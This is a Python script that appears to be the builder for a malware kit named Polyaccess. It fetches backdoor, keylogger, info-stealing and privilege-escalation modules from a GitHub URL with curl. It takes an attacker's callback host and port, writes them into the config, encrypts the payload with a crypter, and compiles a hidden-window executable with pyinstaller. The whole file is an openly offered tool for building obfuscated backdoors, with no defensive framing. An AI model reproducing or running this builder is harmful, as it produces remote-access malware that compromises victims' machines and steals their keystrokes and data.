import fileinput
import time
import os
import ipaddress

RED = '\033[91m'
RESET = '\033[0m'
GREEN = '\033[92m'

ipv4 = "127.0.0.1"
port = 5555

filename = ["config.py", "backdoor.py", "keylogger.py", "getinfo.py", "weakcheck.py", "elevated.py", "requirements.txt"]


def check(ip):
    try:
        ipaddress.ip_address(ip)
        return False
    except ValueError:
        return True


def checkfile():
    for file in filename:
        if not os.path.isfile(file):
            print(RED + f"{file} not found" + RESET)
            print(f"Downloading {file}....")
            os.system(f"curl https://raw.githubusercontent.com/polymaster3313/Polyaccess/main/malware/{file} -o {file}")
        else:
            print(GREEN + f"{file} found" + RESET)

def builder():
    global ipv4
    global port
    

    ipv4 = input("LHOST: ")
    while ipv4.strip() == "":
        print("it cant be empty")
        ipv4 = input("LHOST: ")

    if check(ipv4):
        print(RED + "Invalid ip address" + RESET)
        time.sleep(1)
        builder()

    port = input("LPORT: ")
    while port.strip() == "":
        print("it cant be empty")
        port = input("LHOST: ")
    modify("config.py")

def startup():
    os.system("python.exe -m pip install --upgrade pip")
    os.system("pip3 install -r requirements.txt")
    print(GREEN + "startup successful!!!" + RESET)



def modify(file):
    try:
        for line in fileinput.input(file, inplace=True, encoding='utf-8'):
            if "lhost" in line:
                line = "lhost = '{}'\n".format(ipv4)
            elif "lport" in line:
                line = "lport = {}\n".format(port)
            print(line, end="")
        print(GREEN + "encrypting file...." + RESET)
        os.system("crypter.py")
        print(GREEN + "file encrypted!!!" + RESET)
        print("building backdoor....")
        os.system("pyinstaller --noconfirm --onefile --windowed --clean encrypted.py")
        print(GREEN + "DONE" + RESET)
        print(GREEN + "output in dist folder"  + RESET)
    except Exception as e:
        print("yeah something went wrong lol")
        print(e)
        input("")



while True:
    opt = input("""

  _ \       |          \                             
 |   | _ \  | |   |   _ \    __|  __|  _ \  __|  __| 
 ___/ (   | | |   |  ___ \  (    (     __/\__ \\__ \ 
_|   \___/ _|\__, |_/    _\\___|\___|\___|____/____/ 
             ____/ 

[1] startup
[2] builder
> """)
    if opt == "1":
        checkfile()
        startup()
    elif opt == "2":
        checkfile()
        builder()
    elif opt == "polyester":
        print(GREEN + "POLYESTER IS COOL" + RESET)
    elif opt == "exit":
        exit()
    else:
        print(RED + "invalid option" + RESET)
